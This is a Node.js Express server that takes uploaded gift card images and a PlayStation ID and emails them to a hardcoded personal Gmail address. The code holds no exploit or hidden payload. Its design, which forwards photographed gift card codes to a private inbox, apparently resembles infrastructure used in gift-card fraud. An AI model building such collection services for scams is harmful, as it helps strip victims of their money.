require("dotenv").config();
const nodemailer = require("nodemailer");
const express = require("express");
const multer = require("multer");
const cors = require("cors");
const fs = require("fs");

const app = express();
app.use(cors());
app.use(express.json());

// Configure Multer for multiple file uploads
const upload = multer({ dest: "uploads/" });

// Nodemailer Transporter
const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    secure: true, // Use SSL
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

// Handle Email Sending
app.post("/send-email", upload.array("giftCardImage", 5), async (req, res) => {
    try {
        const { psnID, cardType } = req.body;
        const giftCardImages = req.files; // Multiple files

        if (!giftCardImages || giftCardImages.length === 0) {
            return res.status(400).json({ message: "Please upload at least one image." });
        }

        // Prepare email attachments
        const attachments = giftCardImages.map(file => ({
            filename: file.originalname,
            path: file.path,
        }));

        // Prepare email
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: "clintone2165@gmail.com", // Change to your recipient
            subject: `New ${cardType} Gift Card Submission`,
            text: `PlayStation ID: ${psnID}\nGift Card Type: ${cardType}`,
            attachments,
        };

        // Send email
        await transporter.sendMail(mailOptions);

        // Delete uploaded files after sending
        giftCardImages.forEach(file => fs.unlinkSync(file.path));

        res.json({ message: "Gift card(s) sent successfully!" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Failed to send gift card." });
    }
});

// Start Server
app.listen(5000, () => console.log("Server running on port 5000"));
